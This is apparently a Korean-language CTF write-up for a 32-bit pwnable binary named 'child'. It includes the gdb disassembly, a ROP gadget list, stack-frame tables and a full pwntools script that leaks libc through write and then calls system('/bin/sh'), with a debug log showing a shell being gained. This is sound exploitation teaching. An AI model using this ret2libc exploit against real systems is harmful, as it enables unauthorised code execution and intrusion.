# child

## binary

```nasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080484e1 <+0>:	push   ebp
   0x080484e2 <+1>:	mov    ebp,esp
   0x080484e4 <+3>:	sub    esp,0x20
   0x080484e7 <+6>:	call   0x80484bb <init>
   0x080484ec <+11>:	push   0x37
   0x080484ee <+13>:	push   0x80485b0
   0x080484f3 <+18>:	push   0x1
   0x080484f5 <+20>:	call   0x80483a0 <write@plt>
   0x080484fa <+25>:	add    esp,0xc
   0x080484fd <+28>:	push   0x7
   0x080484ff <+30>:	push   0x80485e7
   0x08048504 <+35>:	push   0x1
   0x08048506 <+37>:	call   0x80483a0 <write@plt>
   0x0804850b <+42>:	add    esp,0xc
   0x0804850e <+45>:	push   0x400
   0x08048513 <+50>:	lea    eax,[ebp-0x20]
   0x08048516 <+53>:	push   eax
   0x08048517 <+54>:	push   0x0
   0x08048519 <+56>:	call   0x8048380 <read@plt>
   0x0804851e <+61>:	add    esp,0xc
   0x08048521 <+64>:	mov    eax,0x0
   
   0x08048526 <+69>:	leave  
   0x08048527 <+70>:	ret    
End of assembler dump.
gdb-peda$ 
```
이번에는 바이너리만이 아니라 `libc.so.6` 까지 제공한다.

`write`,  `read`함수가 존재한다. 이를 이용해 `libc.so.6`를 leak하고  `system`함수를 호출해 쉘을 획득하자.

먼저 필요한 것을 정리하자. 

```
main
write_plt
write_got
write_offset
system_offset
binsh_offset
exit_offset
pop3ret
popret
```

위에서 Gadget을 제외하고는 `pwntool`을 이용해 얻을 수 있으므로 `gdb`를 이용해 Gadget을 찾아주자

```bash
gdb-peda$ ropgadget
ret = 0x8048342
popret = 0x8048359
pop2ret = 0x804858a
pop4ret = 0x8048588
pop3ret = 0x8048589
addesp_8 = 0x80484cb
addesp_12 = 0x8048356
addesp_16 = 0x8048425
gdb-peda$ 
```

첫번째 ROP code와 스택 프레임을 작성해보자.

```c
write(1, write_got, 4);
goto main;
```

Stack | Explanation
---- | ----
write plt | ret of main
pop3ret | ret of write
1 | Argv1
write got | Argv2
4 | Argv3
main | ret of gadget

`main`으로 돌아온 후의 스택 프레임은 아래와 같이 작성하면 된다.

Stack | Explanation
---- | ----
system | ret of main
exit | ret of system
"/bin/sh" | Argv1

## exploit.py

```python 
from pwn import *

context.log_level = 'debug'

lib = ELF('./libc.so.6')
binary = ELF('./child')

write_offset = lib.symbols['write']
system_offset = lib.symbols['system']
exit_offset = lib.symbols['exit']

read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']
main = binary.symbols['main']

pr = 0x8048359
pppr = 0x8048589

payload = 'a'*36

payload += p32(write_plt) + p32(pppr) + p32(1) + p32(write_got) + p32(4) + p32(main)

p = process('./child', env={'LD_PRELOAD' : "libc.so.6"})
#gdb.attach(proc.pidof(p)[0], 'b *main + 70')
p.recvuntil('you > \x00', timeout=1)
p.sendline(payload)
leak = p.recvn(4)
print 'leaked: ' + hex(u32(leak))
libc = u32(leak) - write_offset
print 'libc: ' + hex(libc)

payload = 'a'*36
payload += p32(system_offset + libc) + p32(exit_offset + libc) + p32(libc + list(lib.search('/bin/sh'))[0])
p.sendline(payload)
p.interactive()
```

```bash
[DEBUG] PLT 0x176b0 _Unwind_Find_FDE
[DEBUG] PLT 0x176c0 realloc
[DEBUG] PLT 0x176e0 memalign
[DEBUG] PLT 0x17710 _dl_find_dso_for_object
[DEBUG] PLT 0x17720 calloc
[DEBUG] PLT 0x17730 ___tls_get_addr
[DEBUG] PLT 0x17740 malloc
[DEBUG] PLT 0x17748 free
[*] '/home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/porb/tmp/child/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] PLT 0x8048370 setbuf
[DEBUG] PLT 0x8048380 read
[DEBUG] PLT 0x8048390 __libc_start_main
[DEBUG] PLT 0x80483a0 write
[DEBUG] PLT 0x80483b0 __gmon_start__
[*] '/home/ubuntu/Desktop/IGRUS/CTF_T34M/INSA/Pwnable/porb/tmp/child/child'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './child' env={'LD_PRELOAD': 'libc.so.6'} : pid 66929
[DEBUG] Received 0x3e bytes:
    00000000  63 68 69 6c  64 20 3a 20  4e 6f 74 68  69 6e 67 20  │chil│d : │Noth│ing │
    00000010  74 6f 20 74  65 6c 6c 20  75 2c 20 4a  75 73 74 20  │to t│ell │u, J│ust │
    00000020  70 72 6f 76  65 20 75 20  61 72 65 20  6e 6f 74 20  │prov│e u │are │not │
    00000030  63 68 69 6c  64 0a 00 79  6f 75 20 3e  20 00        │chil│d··y│ou >│ ·│
    0000003e
[DEBUG] Sent 0x3d bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  a0 83 04 08  89 85 04 08  01 00 00 00  │aaaa│····│····│····│
    00000030  18 a0 04 08  04 00 00 00  e1 84 04 08  0a           │····│····│····│·│
    0000003d
[DEBUG] Received 0x42 bytes:
    00000000  70 7b e6 f7  63 68 69 6c  64 20 3a 20  4e 6f 74 68  │p{··│chil│d : │Noth│
    00000010  69 6e 67 20  74 6f 20 74  65 6c 6c 20  75 2c 20 4a  │ing │to t│ell │u, J│
    00000020  75 73 74 20  70 72 6f 76  65 20 75 20  61 72 65 20  │ust │prov│e u │are │
    00000030  6e 6f 74 20  63 68 69 6c  64 0a 00 79  6f 75 20 3e  │not │chil│d··y│ou >│
    00000040  20 00                                               │ ·│
    00000042
leaked: 0xf7e67b70
libc: 0xf7d92000
[DEBUG] Sent 0x31 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  a0 cd dc f7  d0 09 dc f7  0b da ee f7  │aaaa│····│····│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
child : Nothing to tell u, Just prove u are not child
\x00you > \x00$ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x81 bytes:
    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n'
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
```